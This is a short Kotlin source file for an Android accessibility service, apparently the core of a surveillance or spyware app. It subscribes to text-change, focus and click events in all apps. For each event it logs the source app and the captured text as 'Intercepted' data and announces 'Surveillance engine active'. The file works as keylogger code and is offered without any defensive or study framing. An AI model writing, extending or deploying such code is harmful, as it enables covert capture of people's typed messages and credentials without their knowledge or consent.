package com.logm1lo.ctos

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class InputMonitoringService : AccessibilityService() {
    private val TAG = "InputMonitoringService"

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
            event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            
            val text = event.text.toString()
            val packageName = event.packageName?.toString() ?: "unknown"
            
            val logMessage = "[onAccessibilityEvent] → Intercepted: APP=$packageName, DATA=$text, TYPE=${event.eventType}"
            Log.d(TAG, logMessage)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "[onInterrupt] → Service interrupted by OS")
    }

    override fun onServiceConnected() {
        Log.d(TAG, "[onServiceConnected] → Entry")
        try {
            val info = serviceInfo
            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or 
                             AccessibilityEvent.TYPE_VIEW_FOCUSED or 
                             AccessibilityEvent.TYPE_VIEW_CLICKED
            info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.notificationTimeout = 100
            serviceInfo = info
            Log.d(TAG, "[onServiceConnected] → Exit: Surveillance engine active")
        } catch (e: Exception) {
            Log.e(TAG, "[onServiceConnected] → Error: Failed to configure service: ${e.message}", e)
        }
    }
}
